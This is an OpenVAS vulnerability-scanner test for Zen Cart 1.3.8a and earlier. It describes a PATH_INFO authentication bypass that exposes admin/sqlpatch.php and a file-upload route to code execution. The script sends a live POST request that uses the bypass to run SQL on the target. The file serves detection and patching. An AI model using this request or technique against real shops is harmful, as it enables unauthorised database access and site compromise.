###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_zencart_code_exec_vuln.nasl 13215 2019-01-22 11:59:45Z cfischer $
#
# Zen Cart Arbitrary Code Execution Vulnerability
#
# Authors:
# Sharath S <sharaths@secpod.com>
#
# Copyright:
# Copyright (c) 2009 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.800820");
  script_version("$Revision: 13215 $");
  script_tag(name:"last_modification", value:"$Date: 2019-01-22 12:59:45 +0100 (Tue, 22 Jan 2019) $");
  script_tag(name:"creation_date", value:"2009-07-03 15:23:01 +0200 (Fri, 03 Jul 2009)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_cve_id("CVE-2009-2254", "CVE-2009-2255");
  script_bugtraq_id(35467, 35468);
  script_name("Zen Cart Arbitrary Code Execution Vulnerability");
  script_xref(name:"URL", value:"http://secunia.com/advisories/35550");
  script_xref(name:"URL", value:"http://www.milw0rm.com/exploits/9004");
  script_xref(name:"URL", value:"http://www.milw0rm.com/exploits/9005");
  script_xref(name:"URL", value:"http://www.zen-cart.com/forum/showthread.php?t=130161");
  script_xref(name:"URL", value:"http://www.zen-cart.com/forum/attachment.php?attachmentid=5965");
  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_copyright("Copyright (C) 2009 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"impact", value:"Successful exploitation will let the remote attacker to execute SQL commands
  or arbitrary code by uploading a .php file, and compromise the application,
  or exploit latent vulnerabilities in the underlying database.");

  script_tag(name:"affected", value:"Zen Cart version 1.3.8a and prior.");

  script_tag(name:"insight", value:"- Error in admin/sqlpatch.php file due to lack of sanitisation of the input
  query string passed into the 'query_string' parameter in an execute action in conjunction with a PATH_INFO of
  password_forgotten.php file.

  - Access to admin/record_company.php is not restricted and can be exploited via the record_company_image parameter
  in conjunction with a PATH_INFO of password_forgotten.php, then accessing this file via a direct request to
  the file in images/.");

  script_tag(name:"solution", value:"Apply the security patch from the references.");

  script_tag(name:"summary", value:"The host is running Zen Cart and is prone to Arbitrary Code
  Execution vulnerability.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_app");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

zencartPort = get_http_port(default:80);
if(!can_host_php(port:zencartPort)){
  exit(0);
}

host = http_host_name(port:zencartPort);

foreach dir (make_list_unique("/", "/zencart", "/cart", cgi_dirs(port:zencartPort))) {

  if(dir == "/")
    dir = "";

  rcvRes = http_get_cache(item:dir + "/admin/login.php", port:zencartPort);

  if(rcvRes =~ "<title>Zen Cart!</title>" && rcvRes =~ "^HTTP/1\.[01] 200") {
    postdata = string('query_string=;');
    req = string(
     "POST ", dir, "/admin/sqlpatch.php/password_forgotten.php?action=execute HTTP/1.1\r\n",
     "Host: ", host, "\r\n",
     "Content-Type: application/x-www-form-urlencoded\r\n",
     "Content-Length: ", strlen(postdata), "\r\n",
     "\r\n",
     postdata
    );
    res = http_keepalive_send_recv(port:zencartPort, data:req, bodyonly:TRUE);

    if("1 statements processed" >< res) {
      security_message(port:zencartPort);
      exit(0);
    }
  }
}

exit(99);